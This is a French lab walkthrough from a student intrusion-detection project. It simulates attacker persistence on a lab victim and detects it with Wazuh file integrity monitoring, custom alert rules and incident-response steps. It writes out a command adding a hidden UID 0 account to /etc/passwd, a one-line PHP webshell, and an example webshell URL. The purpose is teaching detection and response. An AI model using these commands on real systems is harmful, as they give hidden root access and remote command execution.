# Attaque 4 — Modification de fichiers sensibles

> Mode opératoire du scénario 4. Contexte et justification : [scénarios](00-scenarios.md#scénario-4--modification-de-fichiers-sensibles-). Prérequis : lab démarré (`lab/lab.sh up`).

- **But** : simuler un attaquant **déjà présent** sur la victime qui se maintient — compte root caché (MITRE T1136.001) et webshell (T1505.003) —, et le détecter par la **surveillance d'intégrité des fichiers** de **Wazuh** (syscheck/FIM).
- **Particularité** : aucune trace réseau. Ni Suricata, ni nginx, ni `auth.log` ne voient ces actions — **ELK ne détecte rien ici**. Seul un HIDS avec FIM les révèle. C'est l'intérêt du scénario.

## 1. Attaque (sur la victime)

Contrairement aux attaques 1 à 3, les commandes se lancent **sur la victime** (root), pas depuis Kali : on joue un attaquant déjà entré. Accès par la console ou par SSH.

```bash
# 1. Compte caché avec UID 0 (= droits root) ajouté à /etc/passwd
echo "pirate:x:0:0::/root:/bin/bash" >> /etc/passwd

# 2. Webshell déposé dans le site DVWA : exécute une commande passée en paramètre HTTP
echo '<?php system($_GET["cmd"]); ?>' > /var/www/dvwa/shell.php
```

La FIM surveille ces deux emplacements en temps réel (`/etc/passwd,/etc/shadow,/etc/sudoers` et `/var/www/dvwa`), intégrée à l'image ([déploiement](../2-wazuh/01-deploiement.md#intégrité-des-fichiers-scénario-4)).

## 2. Vérifications

**Victime** — la surveillance temps réel est bien active :

```bash
grep -E "realtime|/etc/passwd|/var/www/dvwa" /var/ossec/etc/ossec.conf
sudo grep -iE "syscheck|realtime" /var/ossec/logs/ossec.log | tail
```

**Wazuh** (`wazuh.grdr.fr`) :
- *Agents → victime → Integrity monitoring* (module FIM) : `/etc/passwd` **Modified** et `/var/www/dvwa/shell.php` **Added**.
- *Threat Hunting*, `agent.name: victime`, groupe `syscheck` :
  - règle **550** (contenu d'un fichier surveillé modifié) sur `/etc/passwd` — grâce à `report_changes`, l'alerte montre **la ligne ajoutée** ;
  - règle **554** (fichier ajouté) sur `/var/www/dvwa/shell.php`.

## 3. Résultat obtenu

Attaque jouée le 21/10/2026, détection par la FIM confirmée côté Wazuh (ELK muet, comme attendu).

![Threat Hunting Wazuh de l'agent victime : alertes syscheck, règle 554 (fichier ajouté) et 550 (fichier modifié)](img/04-modification-fichiers/wazuh-fim-alerts.png)

**Wazuh** : les deux événements remontent dans le groupe `syscheck` — `shell.php` **ajouté** (554) et `/etc/passwd` **modifié** (550), source `victime`.

![Détail de l'alerte 550 : le diff report_changes montre la ligne pirate:x:0:0 ajoutée à /etc/passwd](img/04-modification-fichiers/wazuh-550-details.png)

Le détail de l'alerte 550 affiche le **diff** produit par `report_changes` : on voit la ligne `pirate:x:0:0:…` réellement ajoutée. La preuve n'est pas seulement « un fichier a changé », mais **ce qui** a changé.


## 4. Points d'attention

- **Zéro trace réseau = angle mort d'un IDS réseau.** C'est la démonstration du scénario : Suricata et les règles ELK ne voient rien. Seule la surveillance locale des fichiers (HIDS) détecte la persistance. Un IDS réseau et un HIDS sont complémentaires.
- **Temps réel contre analyse périodique.** Par défaut syscheck ne repasse que toutes les 12 h : la détection serait différée. `realtime="yes"` sur les répertoires sensibles donne une alerte immédiate.
- **`report_changes` = la preuve du contenu.** Sans cette option, l'alerte dirait seulement « fichier modifié » ; avec elle, on voit **quoi** a été ajouté (`pirate:x:0:0:…`), ce qui qualifie directement la menace.
- **Pourquoi c'est grave.** Un compte d'UID 0 donne un accès root permanent ; le webshell permet d'exécuter des commandes à distance par simple requête HTTP (`http://10.10.10.10/shell.php?cmd=id`).

## 5. Réponse de l'administrateur

Cette section couvre la chaîne complète : **alerte → notification → explication → réponse**.

### 5.1 Alertes et notifications déclenchées

| Plateforme | Règle | Niveau par défaut | Notifiée (seuil ≥ 10) |
| --- | --- | --- | --- |
| Wazuh | **550** — fichier surveillé modifié (`/etc/passwd`, diff `report_changes`) | 7 | ❌ **non**, sans réglage |
| Wazuh | **554** — fichier ajouté (`/var/www/dvwa/shell.php`) | 5 | ❌ **non**, sans réglage |
| ELK | aucune alerte (angle mort : zéro trace réseau) | — | — |

Ces niveaux sont ceux par défaut de Wazuh ; ils sont faibles parce qu'une modification de fichier est **banale** en général (mises à jour, configuration). Elle devient critique sur des fichiers précis. Il faut donc les rehausser **ciblément**, plutôt que d'abaisser le seuil global (qui noierait l'administrateur) :

```xml
<group name="local,syscheck,persistence,">
  <rule id="100040" level="12">
    <if_sid>550</if_sid>
    <field name="file">^/etc/passwd$|^/etc/shadow$|^/etc/sudoers$</field>
    <description>Lab - Fichier de comptes modifié : persistance possible</description>
    <mitre><id>T1565.001</id></mitre>
  </rule>
  <rule id="100041" level="12">
    <if_sid>554</if_sid>
    <field name="file">^/var/www/.+\.php$</field>
    <description>Lab - Nouveau fichier PHP dans le site : webshell possible</description>
    <mitre><id>T1505.003</id></mitre>
  </rule>
</group>
```

```bash
# Sur le manager : valider puis recharger
/var/ossec/bin/wazuh-logtest
/var/ossec/bin/wazuh-control restart
```

À ce niveau 12, ces règles passent le seuil Slack/courriel ([configuration](../2-wazuh/01-deploiement.md#notifications)) : c'est la seule voie de notification de ce scénario, ELK étant muet.

### 5.2 Ce que reçoit l'administrateur

Message type (exemple indicatif) :

```
[Wazuh] Alerte niveau 12 — règle 100040
Description : Lab - Fichier de comptes modifié : persistance possible
Agent       : victime (004)
Fichier     : /etc/passwd
Ajouté      : pirate:x:0:0::/root:/bin/bash
```

Le diff `report_changes` est dans le message : l'administrateur voit **ce qui** a changé sans ouvrir le dashboard.

### 5.3 Explication pour l'administrateur

| Question | Réponse |
| --- | --- |
| **Que s'est-il passé ?** | Quelqu'un avec des droits root **sur la machine** a ajouté un compte `pirate` d'UID 0 (= root) à `/etc/passwd`, et déposé `shell.php`, un fichier qui exécute toute commande passée dans l'URL. |
| **Pourquoi est-ce une alerte ?** | Ces fichiers ne changent presque jamais hors maintenance. Un compte d'UID 0 inconnu est un compte root caché ; un `.php` apparu hors déploiement est une porte dérobée. |
| **Quelle gravité ?** | **Critique : la machine est déjà compromise.** L'attaquant est entré avant ; ces actions sont de la *persistance*. Il peut revenir à tout moment, avec les droits root, y compris par `http://10.10.10.10/shell.php?cmd=id`. |
| **Alerte confirmée ou faux positif ?** | Vérifier le journal de changements de l'équipe : un administrateur légitime a-t-il créé ce compte ou déployé ce fichier ? Un compte d'UID 0 qui n'est pas `root` et un `.php` d'une ligne appelant `system()` n'ont aucune explication légitime. |
| **Et après ?** | Remonter au **vecteur d'entrée** : c'est l'étape suivante de la réponse. |

### 5.4 Actions de réponse

**1. Qualifier : mesurer l'étendue (avant de nettoyer, pour ne pas détruire les preuves).**

```bash
# Comptes d'UID 0 et comptes récents
awk -F: '$3==0 {print}' /etc/passwd
sudo find /etc -newermt "-1 day" -type f -ls 2>/dev/null
# Webshells : fichiers PHP récents ou contenant des fonctions d'exécution
sudo find /var/www -name "*.php" -mtime -1 -ls
sudo grep -rnE "system\(|exec\(|shell_exec|passthru|eval\(" /var/www/dvwa --include=*.php | grep -v "vulnerabilities/exec"
# Le webshell a-t-il servi ?
sudo grep "shell.php" /var/log/nginx/access.log
# Sessions et clés SSH ajoutées
last -i | head ; sudo find / -name authorized_keys -newermt "-1 day" 2>/dev/null
```

Copier `/etc/passwd`, `shell.php` et les logs sur un support externe **avant** suppression (preuves).

**2. Contenir : couper l'accès.**

```bash
sudo ufw deny from 10.10.10.30
sudo pkill -u pirate 2>/dev/null     # fermer d'éventuelles sessions du compte caché
```

**3. Éradiquer.**

```bash
sudo sed -i '/^pirate:/d' /etc/passwd
sudo rm -f /var/www/dvwa/shell.php
```

**4. Trouver le vecteur d'entrée.** Corréler avec les scénarios 1 et 2 depuis la même source : `Accepted password` après un brute-force ([attaque 1](01-brute-force-ssh.md#5-réponse-de-ladministrateur)), ou SQLi/LFI réussie ([attaque 2](02-attaque-web.md#6-réponse-de-ladministrateur)). Sans le vecteur, la faille reste ouverte et l'attaquant reviendra.

**5. Reconstruire plutôt que nettoyer.** Un attaquant root a pu modifier d'autres éléments (binaires, modules du noyau, tâches cron) que la FIM ne surveille pas. La machine est **à reconstruire à partir d'une image saine**, secrets renouvelés (mots de passe, clés SSH, identifiants de base de données).
## 6. Remise à zéro

```bash
# Sur la victime, retirer les artefacts de l'attaque
sudo sed -i '/^pirate:/d' /etc/passwd
sudo rm -f /var/www/dvwa/shell.php
```

Ou simplement repartir d'une image propre :

```bash
cd ~/cours/secu-info/projet-ids/lab && ./lab.sh down && ./lab.sh reset && ./lab.sh up
```
